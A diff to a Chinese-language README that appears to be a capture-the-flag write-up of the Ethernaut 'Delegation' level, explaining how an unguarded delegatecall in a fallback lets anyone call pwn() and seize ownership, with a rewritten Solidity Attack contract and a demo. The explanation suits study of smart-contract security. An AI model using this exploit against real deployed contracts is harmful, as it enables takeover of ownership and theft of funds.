@@ -492,6 +492,26 @@ contract Delegation {
 
 Delegate合约倒简单，直接换个用户调用pwn()就改掉了owner
 
+关键是Delegation合约，
+
+(bool result,) = address(delegate).delegatecall(msg.data);
+
+因为再Fallback函数中，且msg.data是我们可控的字段，这样就能让他delegatecall我们想要的函数，怎么实现更改owner呢？
+
+这里就要提到delegatecall和call的区别：
+
+https://github.com/AmazingAng/WTF-Solidity/tree/main/23_Delegatecall
+
+![image-20240412155253604](README.assets/image-20240412155253604.png)
+
+这里Delegate就相当于合约C
+
+Delegation合约就相当于B
+
+所以我们需要通过合约Delegation 通过delegatecall调用合约Delegate的pwn函数，就能改变合约Delegation的owner，因为变量会作用在Delegation
+
+因此攻击合约就需要转账给Delegation ，触发fallback，同时msg.data为pwn()函数的编码，触发delegatecall，就能达到效果
+
 ```
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
@@ -525,17 +545,34 @@ contract Delegation {
     }
 }
 
-contract Attack{
-    Delegation delegation;
-    constructor(Delegation _delegateAddress) payable {
-        delegation = Delegation(_delegateAddress);
+contract Attack {
+    // Delegation 合约地址
+    Delegation public delegationContract;
+
+    constructor(address _delegationContractAddress) {
+        delegationContract = Delegation(_delegationContractAddress);
     }
-    function attackDelegate() public payable {
-        (bool isSuccess, /* memory data */ ) = payable(address(delegation)).call{value: 1 wei}("pwn");
-        require(isSuccess, "Failure! Ether not send.");
+
+    function attack() public payable {
+        // 构造pwn函数的二进制编码，用于delegatecall调用
+        bytes memory payload = abi.encodeWithSignature("pwn()");
+
+        // 转账，触发Delegation 合约的 fallback 函数
+        (bool success, ) = address(delegationContract).call(payload);
+        require(success, "Attack failed");
     }
 }
 ```
+
+演示：
+
+用户 1 2 3分别部署三个合约，查看Delegation的owner是用户2 0xAb8...
+
+![image-20240412160030372](README.assets/image-20240412160030372.png)
+
+我们输入msg.value，点击attack触发，再看owner已经是我们攻击合约的地址：
+
+![image-20240412160046667](README.assets/image-20240412160046667.png)
 
 
 
